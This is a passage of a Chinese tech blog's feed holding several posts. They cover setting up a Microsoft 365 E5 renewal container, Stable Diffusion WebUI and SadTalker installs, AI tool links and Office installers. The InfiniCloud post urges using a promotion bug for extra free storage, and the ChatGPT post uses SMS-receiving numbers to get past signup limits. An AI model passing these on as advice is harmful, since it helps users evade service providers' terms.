<h2 id="18-点击“值”该列中的“复制”（不要复制”ID”列中的值），并立即将该密码保存至电脑，保存的值即为“客户端密码”，-注：该值必须立即保存，退出该页面后将永远无法查看。"><a href="#18-点击“值”该列中的“复制”（不要复制”ID”列中的值），并立即将该密码保存至电脑，保存的值即为“客户端密码”，-注：该值必须立即保存，退出该页面后将永远无法查看。" class="headerlink" title="18.点击“值”该列中的“复制”（不要复制”ID”列中的值），并立即将该密码保存至电脑，保存的值即为“客户端密码”， 注：该值必须立即保存，退出该页面后将永远无法查看。"></a>18.点击“值”该列中的“复制”（不要复制”ID”列中的值），并立即将该密码保存至电脑，保存的值即为“客户端密码”， 注：该值必须立即保存，退出该页面后将永远无法查看。</h2><p><img src="/img/e5/14.webp" alt="2020120711360840"></p>
<h2 id="19-将账号API调用托管至服务"><a href="#19-将账号API调用托管至服务" class="headerlink" title="19.将账号API调用托管至服务"></a>19.将账号API调用托管至服务</h2><p>创建一个新的E5子账户(可选步骤)<br>登入E5管理员账户进入管理员界面，创建一个新的子账户，使用这个子账户登录程序调用API。<br>为什么建议这样做：Microsoft 365 E5 Renew中的部分API包含了写操作，例如邮件和Onedrive的API，这些API在随机模式下会生成大量垃圾邮件和文件（虽然单独为此设立了一个文件夹），部分人可能会对此行为非常介意，而且程序频繁的读写可能会对您正常使用账户造成影响，因此不建议使用管理员账户登录。</p>
<h1 id="Docker-部署步骤"><a href="#Docker-部署步骤" class="headerlink" title="Docker 部署步骤"></a>Docker 部署步骤</h1><h2 id="运行MS365-E5-Renew-X镜像，得到容器"><a href="#运行MS365-E5-Renew-X镜像，得到容器" class="headerlink" title="运行MS365 E5 Renew X镜像，得到容器"></a>运行MS365 E5 Renew X镜像，得到容器</h2><h3 id="原本AMD64版"><a href="#原本AMD64版" class="headerlink" title="原本AMD64版"></a>原本AMD64版</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull hanhongyong/ms365-e5-renew-x:pubemail</span><br><span class="line"><span class="comment">#创建容器</span></span><br><span class="line">docker run -d -p 1066:1066 -e TZ=Asia/Shanghai -e sender=<span class="string">&quot;by123@163.com&quot;</span> -e <span class="built_in">pwd</span>=<span class="string">&quot;UNxxxxxxxxN&quot;</span> -e receiver=<span class="string">&quot;4dddqqq9dd6@qq.com&quot;</span>  -e adminpwd=<span class="string">&quot;123456&quot;</span> hanhongyong/ms365-e5-renew-x:pubemail</span><br></pre></td></tr></table></figure>
<p>修改-e后面的内容，其中 sender &#x3D; ‘<a href="mailto:&#49;&#50;&#x33;&#x34;&#x35;&#54;&#64;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#109;">&#49;&#50;&#x33;&#x34;&#x35;&#54;&#64;&#x31;&#x36;&#51;&#46;&#99;&#x6f;&#109;</a>’为发送邮件的邮箱。 receiver &#x3D; ‘<a href="mailto:&#x37;&#56;&#57;&#52;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#x37;&#56;&#57;&#52;&#x35;&#54;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a>’为接收邮件的邮箱。其中pwd为发送邮箱的授权码。授权码获取方式为，进入网页版163邮箱，点击设置，点击POP3&#x2F;SMTP&#x2F;IMAP，点击授权密码管理，新增授权码即可。 adminpwd为web界面的登录密码。</p>
<h3 id="ARM64和AMD64全架构版（推荐使用）"><a href="#ARM64和AMD64全架构版（推荐使用）" class="headerlink" title="ARM64和AMD64全架构版（推荐使用）"></a>ARM64和AMD64全架构版（推荐使用）</h3><p>项目地址：<a href="https://github.com/Gladtbam/ms365_e5_renewx">Gladtbam&#x2F;ms365_e5_renewx: Microsoft365 E5 Renew X Docker 镜像 (github.com)</a><br>拉取镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull gladtbam/ms365_e5_renewx:latest</span><br></pre></td></tr></table></figure>


<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ghcr.io/gladtbam/ms365_e5_renewx:latest</span><br></pre></td></tr></table></figure>

<p>使用默认配置部署</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">    -p 1066:1066 \</span><br><span class="line">    --name RenewX \</span><br><span class="line">gladtbam/ms365_e5_renewx:latest</span><br></pre></td></tr></table></figure>

<p><strong>默认配置密码为：12345678</strong></p>
<h2 id="服务访问：输入ip-1066"><a href="#服务访问：输入ip-1066" class="headerlink" title="服务访问：输入ip:1066."></a>服务访问：输入ip:1066.</h2><p><img src="/img/e5/15.webp" alt="cf273bdfc7b94446b0da3976e3d4fc45-1682048433172"></p>
<h2 id="1-进入网站注册并登录账户"><a href="#1-进入网站注册并登录账户" class="headerlink" title="1.进入网站注册并登录账户"></a>1.进入网站注册并登录账户</h2><p>第一次登录账户系统会显示注册成功，然后再登录一次即可登录进入系统<br><img src="/img/e5/16.webp" alt="f28bc7fca3b14041a07aaa668c046880"></p>
<h2 id="2-激活您的账户"><a href="#2-激活您的账户" class="headerlink" title="2.激活您的账户"></a>2.激活您的账户</h2><p>阅读并同意用户协议，点击激活账户<br><img src="/img/e5/17.webp" alt="6bd48d17b7774ff182f0c0af156e41af"></p>
<h2 id="3-添加一个E5账户的运行配置信息"><a href="#3-添加一个E5账户的运行配置信息" class="headerlink" title="3.添加一个E5账户的运行配置信息"></a>3.添加一个E5账户的运行配置信息</h2><p>在成功登录系统后，页面会自动跳转到“主页”页面，在“账户详情”页面点击“添加运行账号”按钮，前往“账户运行配置”页面，登录子账户的账号，应用程序(客户端) ID，密码<br><img src="/img/e5/18.webp" alt="2375b23f6de74f5e9d9ff37bca1e7dcc"><br>在账户运行配置页面中填写账户信息，且登录调用填写账户密码、非登录调用填写客户端密码，并选择自己选定的调用方式，注意调用方式不要选错了！！！ 最后点击“添加运行账号”按钮完成配置。<br><img src="/img/e5/19.webp" alt="eb5d982940a340719b4b5dbd1a46420c"><br>由于前后台数据同步需要时间，任何添加账户或者修改账户配置信息的操作都不会立即被后台执行。<br>返回用户页面查看账户信息中的“配置同步状态”，如果显示为“正在运行”表明配置已经上传至后台，修改账户配置成功。<br>警示：配置成功了也要定期来看看自己的账户是否在正常运行（虽然有邮件通知服务），但也建议每月查看一次账户状态！！！<br><img src="/img/e5/20.webp" alt="3b2651537fee45088202efd02cad6d74"></p>
<p>内容摘取于<br><a href="https://blog.csdn.net/qq_33212020/article/details/119747634">https://blog.csdn.net/qq_33212020/article/details/119747634</a><br><a href="https://blog.csdn.net/qq_40605167/article/details/122888580">https://blog.csdn.net/qq_40605167/article/details/122888580</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>onedrive</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>onedrive</tag>
      </tags>
  </entry>
  <entry>
    <title>注册使用 chatgpt，接码，获取apI-key</title>
    <url>/posts/7fb0c313/</url>
    <content><![CDATA[<p>访问ChatGPT登录页：<a href="https://chat.openai.com/auth/login">https://chat.openai.com/auth/login</a></p>
<p>使用境外接码网站sms-activate：<a href="https://sms-activate.org/">https://sms-activate.org</a></p>
<p>OpenAI账号面板：<a href="https://platform.openai.com/overview">https://platform.openai.com/overview</a></p>
<p>OpenAI账单面板：<a href="https://platform.openai.com/account/billing/overview">https://platform.openai.com/account/billing/overview</a></p>
<p>OepnAI 用量额度（免费账户都有5刀额度）：<a href="https://platform.openai.com/account/usage">https://platform.openai.com/account/usage</a></p>
<p>OpenAI API-key：<a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>whisper 文字转语音、音频转文字</title>
    <url>/posts/5bd974fe/</url>
    <content><![CDATA[<p>GPU版链接：<a href="https://github.com/Const-me/Whisper/releases">https://github.com/Const-me/Whisper/releases</a></p>
<p>语言模型：<a href="https://huggingface.co/datasets/ggerganov/whisper.cpp/tree/main">https://huggingface.co/datasets/ggerganov/whisper.cpp/tree/main</a></p>
<p>大型语言模型<br>ggml-large.bin</p>
<p>CPU版链接：<a href="https://github.com/chidiwilliams/buzz/releases">https://github.com/chidiwilliams/buzz/releases</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>whisper</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>whisper</tag>
      </tags>
  </entry>
  <entry>
    <title>白嫖日本网盘 infinicloud 永久45G，速度超快，支持webdav协议，用raidrive给它挂载到本地电脑上</title>
    <url>/posts/e3e0740c/</url>
    <content><![CDATA[<p>InfiniCloud是一款非常不错的日本网盘，不仅速度快，而且还支持 WebDAV 同步！</p>
<p>即使你在大陆也无需翻墙即可访问网盘。</p>
<p>免费用户默认 20G 永久空间，输入注册码：【FDUMT】还能得到额外5G的永久免费空间，</p>
<p>最近有个初期容量変更特典，新老用户可以再领 2 次 10GB 的永久空间。加到一起足足是 45GB 的免费网盘！</p>
<p>获取额外的 2 个 10GB 永久网盘容量方法：<br>官方有个活动是老用户通过官方的邮件邀请可获得 10G 永久空间的升级，可以将(jp,en)语言的两个链接各领取一次。经过网友实测，新用户也能用，而且新用户初始容量是 20G + 5G ，加上这两个 10GB 后可以达到 45G 的永久免费网盘空间，此 Bug 要趁早使用，估计很快就会被修复。</p>
<p>英文邀请网址:<br><a href="https://infini-cloud.net/en/modules/bonus/code=202304_10GB_jp/userid=%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D">https://infini-cloud.net/en/modules/bonus/code=202304_10GB_jp/userid=你的用户名</a></p>
<p>日语邀请网址：<br><a href="https://infini-cloud.net/en/modules/bonus/code=202304_10GB_en/userid=%E4%BD%A0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D">https://infini-cloud.net/en/modules/bonus/code=202304_10GB_en/userid=你的用户名</a></p>
<p>这样即可实现 45GB 永久免费容量！按照以上步骤操作，可获得20GB+5GB+20GB&#x3D;45GB免费容量，有兴趣可以在首页参加免费一年的15G容量赠送获得，将 InfiniCLOUD 帐户关联到3个App即可领取。</p>
<p>白鲁到45G免费网盘后，现在我们需要开启 WebDav 来更好的使用它！<br>进入个人中心，找到Apps Connection<br>勾选Turn on Apps Connection 并在弹出窗口中勾选同意按钮即可<br>开通以后记住自己的密码，现在我们通过图形化的映射软件——RaiDrive 给它挂载到本地电脑上</p>
<p>RaiDrive：<a href="https://infini-cloud.net/en/index.html">https://infini-cloud.net/en/index.html</a></p>
]]></content>
      <categories>
        <category>infinicloud</category>
      </categories>
      <tags>
        <tag>infinicloud</tag>
      </tags>
  </entry>
  <entry>
    <title>wav2lip 图片或视频同步音频嘴唇动作</title>
    <url>/posts/c09d96e5/</url>
    <content><![CDATA[<p><a href="https://github.com/dunnousername/Wav2Lip">https://github.com/dunnousername/Wav2Lip</a></p>
<p>windows版客户端v0.1.1 GUI<br><a href="https://github.com/dunnousername/Wav2Lip/releases">https://github.com/dunnousername/Wav2Lip/releases</a></p>
<p><a href="https://github.com/Rudrabha/Wav2Lip">https://github.com/Rudrabha/Wav2Lip</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>wav2lip</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>wav2lip</tag>
      </tags>
  </entry>
  <entry>
    <title>在 windows 安装运行 stable diffusion webui（手动下载安装python依赖库和模型）指南</title>
    <url>/posts/915bc3a5/</url>
    <content><![CDATA[<h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><h2 id="Python-3-10-6-（win10以上装3-10-10以上版本）"><a href="#Python-3-10-6-（win10以上装3-10-10以上版本）" class="headerlink" title="Python 3.10.6 （win10以上装3.10.10以上版本）"></a>Python 3.10.6 （win10以上装3.10.10以上版本）</h2><p><a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p>
<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p>
<h1 id="AUTOMATIC1111-stable-diffusion-webui"><a href="#AUTOMATIC1111-stable-diffusion-webui" class="headerlink" title="AUTOMATIC1111&#x2F;stable-diffusion-webui"></a>AUTOMATIC1111&#x2F;stable-diffusion-webui</h1><p><a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">https://github.com/AUTOMATIC1111/stable-diffusion-webui</a></p>
<h2 id="下载Stable-Diffusion源码库"><a href="#下载Stable-Diffusion源码库" class="headerlink" title="下载Stable Diffusion源码库"></a>下载Stable Diffusion源码库</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git</span><br></pre></td></tr></table></figure>
<h2 id="进去-stable-diffusion-webui-文件夹"><a href="#进去-stable-diffusion-webui-文件夹" class="headerlink" title="进去 stable-diffusion-webui 文件夹"></a>进去 stable-diffusion-webui 文件夹</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> stable-diffusion-webui</span><br></pre></td></tr></table></figure>
<h2 id="运行下载安装脚本（大陆网络环境会出错）"><a href="#运行下载安装脚本（大陆网络环境会出错）" class="headerlink" title="运行下载安装脚本（大陆网络环境会出错）"></a>运行下载安装脚本（大陆网络环境会出错）</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">webui-user.bat</span><br></pre></td></tr></table></figure>

<h1 id="大陆网络环境出错解决办法："><a href="#大陆网络环境出错解决办法：" class="headerlink" title="大陆网络环境出错解决办法："></a>大陆网络环境出错解决办法：</h1><h2 id="根目录缺少虚拟python环境venv的依赖包GFPGAN和open-clip"><a href="#根目录缺少虚拟python环境venv的依赖包GFPGAN和open-clip" class="headerlink" title="根目录缺少虚拟python环境venv的依赖包GFPGAN和open_clip"></a>根目录缺少虚拟python环境venv的依赖包GFPGAN和open_clip</h2><h2 id="TencentARC-GFPGAN"><a href="#TencentARC-GFPGAN" class="headerlink" title="TencentARC&#x2F;GFPGAN"></a>TencentARC&#x2F;GFPGAN</h2><p><a href="https://github.com/TencentARC/GFPGAN">https://github.com/TencentARC/GFPGAN</a><br>克隆，下载zip，获得GFPGAN-master放在d:\stable-diffusion-webui\venv\Scripts\GFPGAN-master<br>打开cmd，cd到d:\stable-diffusion-webui\venv\Scripts\GFPGAN-master下，<br>使用命令d:\stable-diffusion-webui\venv\Scripts\python.exe -m pip install basicsr facexlib安装GFPGAN的依赖。<br>再使用d:\stable-diffusion-webui\venv\Scripts\python.exe -m pip install -r requirements.txt安装GFPGAN的依赖。<br>使用d:\stable-diffusion-webui\venv\Scripts\python.exe setup.py develop安装GFPGAN。<br>安装完毕后，再打开stable diffusion根目录的webui-user.bat会发现不再要求安装GFPGAN。</p>
<h2 id="mlfoundations-open-clip"><a href="#mlfoundations-open-clip" class="headerlink" title="mlfoundations&#x2F;open_clip"></a>mlfoundations&#x2F;open_clip</h2><p><a href="https://github.com/mlfoundations/open_clip">https://github.com/mlfoundations/open_clip</a><br>同理，克隆，下载zip，获得open_clip-main放在d:\stable-diffusion-webui\venv\Scripts\open_clip-main<br>打开cmd，cd到d:\stable-diffusion-webui\venv\Scripts\open_clip-main下，<br>使用d:\stable-diffusion-webui\venv\Scripts\python.exe setup.py build install安装open_clip<br><img src="/img/sd/1.webp" alt="1"></p>
<h2 id="repositories里缺少taming-transformers，k-diffusion，CodeFormer，BLIP"><a href="#repositories里缺少taming-transformers，k-diffusion，CodeFormer，BLIP" class="headerlink" title="repositories里缺少taming-transformers，k-diffusion，CodeFormer，BLIP"></a>repositories里缺少taming-transformers，k-diffusion，CodeFormer，BLIP</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/CompVis/taming-transformers.git “你目录地址\repositories\taming-transformers”</span><br><span class="line"></span><br><span class="line">git clone https://github.com/crowsonkb/k-diffusion.git “你目录地址\repositories\k-diffusion”</span><br><span class="line"></span><br><span class="line">git clone https://github.com/sczhou/CodeFormer.git “你目录地址\repositories\CodeFormer”</span><br><span class="line"></span><br><span class="line">git clone https://github.com/salesforce/BLIP.git “你目录地址\repositories\BLIP”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/img/sd/2.webp" alt="2"></p>
<h1 id="xformers的问题，这个直接按下图的文件名添加："><a href="#xformers的问题，这个直接按下图的文件名添加：" class="headerlink" title="xformers的问题，这个直接按下图的文件名添加："></a>xformers的问题，这个直接按下图的文件名添加：</h1><p><img src="/img/sd/3.webp" alt="3"></p>
<h1 id="最后是下载ckpt基础模型"><a href="#最后是下载ckpt基础模型" class="headerlink" title="最后是下载ckpt基础模型"></a>最后是下载ckpt基础模型</h1><p>其中有Chilloutmix-Ni 网盘下载 <a href="https://www.123pan.com/s/sKd9-LkJc.html">https://www.123pan.com/s/sKd9-LkJc.html</a></p>
<h1 id="然后是各类的角色模型"><a href="#然后是各类的角色模型" class="headerlink" title="然后是各类的角色模型"></a>然后是各类的角色模型</h1><h2 id="Civitai-C站-AI绘画图片生成模型资源下载社区网站-https-civitai-com"><a href="#Civitai-C站-AI绘画图片生成模型资源下载社区网站-https-civitai-com" class="headerlink" title="Civitai(C站): AI绘画图片生成模型资源下载社区网站 https://civitai.com/"></a>Civitai(C站): AI绘画图片生成模型资源下载社区网站 <a href="https://civitai.com/">https://civitai.com/</a></h2><h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>下载基础模型ChilloutMix，移动至<em>\stable-diffusion-webui\models\Stable-diffusion目录。<br>下载需要的角色模型，移动至</em>\stable-diffusion-webui\models\Lora目录。<br>重启Stable Diffusion WebUI主界面<br>在Stable Diffusion WebUI的主界面左上角加载基础模型ChilloutMix。<br>在SD的文生图或图生图界面内的生成按钮下，可以看到一个粉色的图标，该图标名为Show extra networks（显示额外网络），点击该红色图标将会在本页弹出一个面板，在该面板中可以看到Lora选项卡。<br>可以看到已经安装的Lora模型，点击模型名称将会自动该角色名称加载到Prompt文本框中。<br>填写一些其它的描述信息和相应的参数之后，就可以看到非常理解的效果了。</p>
<h1 id="编辑-webui-user-bat-后运行"><a href="#编辑-webui-user-bat-后运行" class="headerlink" title="编辑 webui-user.bat 后运行"></a>编辑 webui-user.bat 后运行</h1><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PYTHON=</span><br><span class="line"><span class="built_in">set</span> GIT=</span><br><span class="line"><span class="built_in">set</span> VENV_DIR=</span><br><span class="line"><span class="built_in">set</span> COMMANDLINE_ARGS=--xformers</span><br><span class="line"><span class="built_in">set</span> PYTORCH_CUDA_ALLOC_CONF=max_split_size_mb:<span class="number">30</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> webui.bat</span><br></pre></td></tr></table></figure>
<h1 id="浏览器地址栏输入-localhost-7860-进入-Stable-Diffusion"><a href="#浏览器地址栏输入-localhost-7860-进入-Stable-Diffusion" class="headerlink" title="浏览器地址栏输入 localhost:7860 进入 Stable Diffusion"></a>浏览器地址栏输入 localhost:7860 进入 Stable Diffusion</h1>]]></content>
      <categories>
        <category>ai</category>
        <category>stablediffusion</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>stable diffusion</tag>
      </tags>
  </entry>
  <entry>
    <title>ai text to speech tts人工语音生成</title>
    <url>/posts/a9a0d74b/</url>
    <content><![CDATA[<p>AI Text to Speech (人工語音生成)</p>
<p>英文<br>beta.elevanlabs.io</p>
<p>广东话和普通话<br><a href="http://www.flexclip.com/tw">http://www.flexclip.com/tw</a><br><a href="http://www.clipchamp.com/">http://www.clipchamp.com</a></p>
<p>MS-TTS&#x2F;Edge-TTS免费文本转语音，一键合成导出MP3音频<br><a href="https://ztjun.fun/archives/162/">https://ztjun.fun/archives/162/</a><br>MS-TTS:V2.0.1.4<br>Edge-TTS:V2.0.0.2<br><a href="https://wwsf.lanzouw.com/i6LOa0um0lze">https://wwsf.lanzouw.com/i6LOa0um0lze</a><br>密码:64dy</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>tts</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>tts</tag>
      </tags>
  </entry>
  <entry>
    <title>安装sadtalker扩展 在 stable diffusion webui 生成虚拟人视频</title>
    <url>/posts/a135222e/</url>
    <content><![CDATA[<h1 id="Winfredy-SadTalker"><a href="#Winfredy-SadTalker" class="headerlink" title="Winfredy&#x2F;SadTalker"></a>Winfredy&#x2F;SadTalker</h1><p><a href="https://github.com/Winfredy/SadTalker">https://github.com/Winfredy/SadTalker</a></p>
<h2 id="Winfredy-SadTalker-releases"><a href="#Winfredy-SadTalker-releases" class="headerlink" title="Winfredy&#x2F;SadTalker&#x2F;releases"></a>Winfredy&#x2F;SadTalker&#x2F;releases</h2><p><a href="https://github.com/Winfredy/SadTalker/releases">https://github.com/Winfredy/SadTalker/releases</a></p>
<h2 id="SadTalker-docs-webui-extension-md"><a href="#SadTalker-docs-webui-extension-md" class="headerlink" title="SadTalker&#x2F;docs&#x2F;webui_extension.md"></a>SadTalker&#x2F;docs&#x2F;webui_extension.md</h2><p><a href="https://github.com/Winfredy/SadTalker/blob/main/docs/webui_extension.md">https://github.com/Winfredy/SadTalker/blob/main/docs/webui_extension.md</a></p>
<h1 id="进去Stable-Diffusion-WebUI-的-Extensions"><a href="#进去Stable-Diffusion-WebUI-的-Extensions" class="headerlink" title="进去Stable Diffusion WebUI 的 Extensions"></a>进去Stable Diffusion WebUI 的 Extensions</h1><p>Install from URL:<br><a href="https://github.com/Winfredy/SadTalker">https://github.com/Winfredy/SadTalker</a></p>
<h1 id="准备文件"><a href="#准备文件" class="headerlink" title="准备文件"></a>准备文件</h1><h2 id="BtbN-FFmpeg-Builds"><a href="#BtbN-FFmpeg-Builds" class="headerlink" title="BtbN&#x2F;FFmpeg-Builds"></a>BtbN&#x2F;FFmpeg-Builds</h2><p><a href="https://github.com/BtbN/FFmpeg-Builds/releases">https://github.com/BtbN/FFmpeg-Builds/releases</a><br><a href="https://drive.google.com/file/d/1rS9gG_1swu-e__hV_qQ_sO5N_Ri7lfDl/view">https://drive.google.com/file/d/1rS9gG_1swu-e__hV_qQ_sO5N_Ri7lfDl/view</a></p>
<h2 id="ffmpeg-master-latest-win64-gpl-bin-里面3个文件复制到-C-Windows-System32"><a href="#ffmpeg-master-latest-win64-gpl-bin-里面3个文件复制到-C-Windows-System32" class="headerlink" title="ffmpeg-master-latest-win64-gpl\bin 里面3个文件复制到 C:\Windows\System32"></a>ffmpeg-master-latest-win64-gpl\bin 里面3个文件复制到 C:\Windows\System32</h2><h2 id="checkpoints-zip"><a href="#checkpoints-zip" class="headerlink" title="checkpoints.zip"></a>checkpoints.zip</h2><p>链接: <a href="https://pan.baidu.com/s/1GZTu20C7afvPBC5I6-M3bA?pwd=7th2">https://pan.baidu.com/s/1GZTu20C7afvPBC5I6-M3bA?pwd=7th2</a> 提取码: 7th2 复制这段内容后打开百度网盘手机App，操作更方便哦<br>解压出来的checkpoints文件夹放到 table-diffusion-webui\extensions\SadTalker </p>
<h2 id="ffmpeg-master-latest-win64-gpl-bin-里面3个文件复制到-C-Windows-System32-1"><a href="#ffmpeg-master-latest-win64-gpl-bin-里面3个文件复制到-C-Windows-System32-1" class="headerlink" title="ffmpeg-master-latest-win64-gpl\bin 里面3个文件复制到 C:\Windows\System32"></a>ffmpeg-master-latest-win64-gpl\bin 里面3个文件复制到 C:\Windows\System32</h2>]]></content>
      <categories>
        <category>ai</category>
        <category>stablediffusion</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>stable diffusion</tag>
        <tag>sadtalker</tag>
      </tags>
  </entry>
  <entry>
    <title>stable diffusion webui｜操作界面汉化教程</title>
    <url>/posts/5a50d017/</url>
    <content><![CDATA[<p>主界面中的Extensions选项卡，点击打开。</p>
<p>打开Extensions选项卡下的Available标签，我们可以通过官方已经给出的插件集合地址，非常便捷的安装维护插件。</p>
<p>取消勾选隐藏localization标签</p>
<p>按下Crlt+F之后我们输入zh_Hans Localization，然后按下回车键。</p>
<p>找到名为zh_Hans Localization的汉化插件，点击最右侧的Install按钮即可。</p>
<p>我们依次点击Settings → User interface → Localization (requires restart) → zh-Hans(Stable) → Apply settings → Reload UI</p>
<p>在点击Reload UI按钮之后，我们将会看到SD的主界面已经被自动刷新，并且全部都是中文。</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>stablediffusion</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>stable diffusion</tag>
      </tags>
  </entry>
  <entry>
    <title>office365, office2021 官方离线安装包</title>
    <url>/posts/d3c88363/</url>
    <content><![CDATA[<p>Microsoft 365、office365、Office 2021，微软官方下载链接，该链接为微软固定连接，不定期更新内部版本号</p>
<p>以下为官方离线安装包下载地址 </p>
<p>安装包含64和32位集合，发帖为止是 2022年11月 版</p>
<h1 id="Office-ProPlus-365"><a href="#Office-ProPlus-365" class="headerlink" title="Office ProPlus 365"></a>Office ProPlus 365</h1><p><a href="https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-CN/O365ProPlusRetail.img">https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-CN/O365ProPlusRetail.img</a></p>
<h1 id="Office-ProPlus-2021"><a href="#Office-ProPlus-2021" class="headerlink" title="Office ProPlus 2021:"></a>Office ProPlus 2021:</h1><p><a href="https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/zh-cn/ProPlus2021Retail.img">https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/zh-cn/ProPlus2021Retail.img</a></p>
<h1 id="Visio-Pro-2021"><a href="#Visio-Pro-2021" class="headerlink" title="Visio Pro 2021"></a>Visio Pro 2021</h1><p><a href="https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-cn/VisioPro2021Retail.img">https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-cn/VisioPro2021Retail.img</a> </p>
<h1 id="Project-Pro-2021"><a href="#Project-Pro-2021" class="headerlink" title="Project Pro 2021"></a>Project Pro 2021</h1><p><a href="https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-cn/ProjectPro2021Retail.img">https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/zh-cn/ProjectPro2021Retail.img</a></p>
<h1 id="Office-365家庭高级版"><a href="#Office-365家庭高级版" class="headerlink" title="Office 365家庭高级版"></a>Office 365家庭高级版</h1><p><a href="https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/zh-CN/O365HomePremRetail.img">https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/zh-CN/O365HomePremRetail.img</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>office</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title>centos linux自动定时备份halo整站文件夹在服务器内</title>
    <url>/posts/3543da7a/</url>
    <content><![CDATA[<h1 id="把-root-halo目录下面的所有文件备份到-data-backup里面，并且保存为halo20190520-tar-gz的压缩文件（20190520是指备份执行时当天的日期2019-5-20），然后只保留最近30天的备份"><a href="#把-root-halo目录下面的所有文件备份到-data-backup里面，并且保存为halo20190520-tar-gz的压缩文件（20190520是指备份执行时当天的日期2019-5-20），然后只保留最近30天的备份" class="headerlink" title="把&#x2F;root&#x2F;.halo目录下面的所有文件备份到&#x2F;data&#x2F;backup里面，并且保存为halo20190520.tar.gz的压缩文件（20190520是指备份执行时当天的日期2019-5-20），然后只保留最近30天的备份"></a>把&#x2F;root&#x2F;.halo目录下面的所有文件备份到&#x2F;data&#x2F;backup里面，并且保存为halo20190520.tar.gz的压缩文件（20190520是指备份执行时当天的日期2019-5-20），然后只保留最近30天的备份</h1><h1 id="1、创建保存备份文件的目录：-data-backup"><a href="#1、创建保存备份文件的目录：-data-backup" class="headerlink" title="1、创建保存备份文件的目录：&#x2F;data&#x2F;backup"></a>1、创建保存备份文件的目录：&#x2F;data&#x2F;backup</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入data文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /data</span><br><span class="line"><span class="comment">#新建backup文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> backup</span><br></pre></td></tr></table></figure>
<h1 id="2、创建备份脚本文件-data-halobackup-sh"><a href="#2、创建备份脚本文件-data-halobackup-sh" class="headerlink" title="2、创建备份脚本文件:&#x2F;data&#x2F;halobackup.sh"></a>2、创建备份脚本文件:&#x2F;data&#x2F;halobackup.sh</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入data文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /data</span><br><span class="line"><span class="comment">#新建编辑halobackup.sh</span></span><br><span class="line">vim halobackup.sh</span><br></pre></td></tr></table></figure>
<p>输入以下内容：</p>
